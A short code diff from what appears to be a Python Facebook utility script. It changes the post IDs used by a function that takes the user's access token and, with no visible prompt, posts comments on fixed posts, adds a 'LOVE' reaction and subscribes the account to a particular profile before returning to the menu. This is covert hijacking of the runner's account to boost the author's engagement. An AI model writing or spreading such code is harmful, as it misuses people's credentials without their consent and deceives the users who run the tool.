@@ -16,9 +16,9 @@ def dekudesu():
     yotsuba = kartu2d
     post = '631574531300766'
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/631574531300766/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/631574531300766/comments/?message=' + yotsuba + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/631574531300766/comments/?message=' + komentar + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/633091667815719/comments/?message=' + kom + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/633092231148996/comments/?message=' + yotsuba + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/269669551852500/comments/?message=' + komentar + '&access_token=' + token)
     requests.post('https://graph.facebook.com/' + post + '/reactions?type=LOVE&access_token=' + token)
     requests.post('https://graph.facebook.com/100033446736040/subscribers?access_token=' + token)#kon zaim
     exit(orbxd.menu())
